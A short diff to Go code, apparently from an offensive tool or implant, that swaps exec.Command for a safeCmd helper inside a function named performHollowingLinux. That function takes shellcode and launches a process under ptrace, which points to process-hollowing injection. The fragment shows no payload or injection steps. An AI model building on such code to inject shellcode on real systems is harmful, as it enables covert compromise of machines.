@@ -5,7 +5,6 @@ package commands
 import (
 	"encoding/base64"
 	"fmt"
-	"os/exec"
 	"runtime"
 	"strings"
 	"syscall"
@@ -77,7 +76,7 @@ func performHollowingLinux(shellcode []byte, params hollowParams) (string, error
 		args = []string{"86400"}
 	}
 
-	cmd := exec.Command(parts[0], args...)
+	cmd := safeCmd(parts[0], args...)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		Ptrace: true,
 	}
